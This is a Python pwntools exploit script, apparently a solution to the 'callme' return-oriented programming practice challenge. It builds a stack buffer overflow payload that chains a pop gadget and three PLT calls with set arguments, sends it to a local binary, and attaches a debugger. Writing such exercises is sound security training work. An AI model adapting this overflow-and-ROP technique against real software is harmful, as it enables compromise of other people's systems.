from pwn import *
from subprocess import Popen, PIPE

context(arch = 'i686', os = 'linux')

# pwn
dirname = os.path.dirname(os.path.abspath(__file__))
proc = process(dirname+'/callme')

#context.terminal = ["bash", "-e"]
context.terminal = ['tmux', 'splitw', '-h']

# デバッガーにアタッチする
#"""
gdb.attach(proc, '''
    set follow-fork-mode child
    b *0x401850
    b *0x401870
    b *0x401810
    b *0x401a56 
    continue
''')
#"""

usefulGadgets = 0x401ab0
"""
0000000000401850 <callme_one@plt>:
    401850:	ff 25 f2 07 20 00    	jmp    QWORD PTR [rip+0x2007f2]        # 602048 <callme_one>
    401856:	68 06 00 00 00       	push   0x6
    40185b:	e9 80 ff ff ff       	jmp    4017e0 <.plt>

0000000000401870 <callme_two@plt>:
    401870:	ff 25 e2 07 20 00    	jmp    QWORD PTR [rip+0x2007e2]        # 602058 <callme_two>
    401876:	68 08 00 00 00       	push   0x8
    40187b:	e9 60 ff ff ff       	jmp    4017e0 <.plt>

0000000000401810 <callme_three@plt>:
    401810:	ff 25 12 08 20 00    	jmp    QWORD PTR [rip+0x200812]        # 602028 <callme_three>
    401816:	68 02 00 00 00       	push   0x2
    40181b:	e9 c0 ff ff ff       	jmp    4017e0 <.plt>

"""
popret = 0x401900
pop2ret = 0x401ab1
pop3ret = 0x401ab0
addesp_8 = 0x4017d6
leaveret = 0x401a55

callme_one = 0x401850
callme_two = 0x401870
callme_three = 0x401810
callme_one_gadget = 0x401a83
callme_two_gadget = 0x401a83
callme_three_gadget = 0x401a6f
return_addr = 0x4019f4
puts = 0x4017f0
useFulFunction = 0x401a57
buffSize = 40

payload = b'A' * buffSize

payload += p64(usefulGadgets)
payload += p64(1) + p64(2) + p64(3)
payload += p64(callme_one)

payload += p64(usefulGadgets)
payload += p64(1) + p64(2) + p64(3)
payload += p64(callme_two)

payload += p64(usefulGadgets)
payload += p64(1) + p64(2) + p64(3)
payload += p64(callme_three)

payload += b"\n"

print(payload)
print(len(payload))

proc.sendlineafter(">",payload)

try:
    while True:
        print(proc.recv())
except EOFError:
    print('EOF')

proc.wait_for_close()
print(proc.poll())  
